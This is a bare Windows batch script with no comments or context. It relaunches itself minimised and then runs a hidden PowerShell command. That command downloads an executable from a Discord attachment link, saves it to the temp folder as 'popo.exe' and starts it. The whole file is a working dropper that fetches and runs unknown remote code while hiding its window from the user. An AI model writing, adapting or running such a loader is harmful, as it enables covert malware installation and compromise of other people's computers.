@echo off
if "%1"=="h" goto :hidden
start /min cmd /c "%~f0" h & exit /b
:hidden
powershell.exe -NoProfile -WindowStyle Hidden -Command "$url='https://cdn.discordapp.com/attachments/1344411176443842676/1459868169459204321/PwS9viEbig.exe?ex=6964d7ae&is=6963862e&hm=8cde39cd0deb3fe5b13da6cd9d9e4c3cc5652e0ff7d20fda325c0e899fe1d52f&';$out=Join-Path $env:TEMP 'popo.exe';Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out"
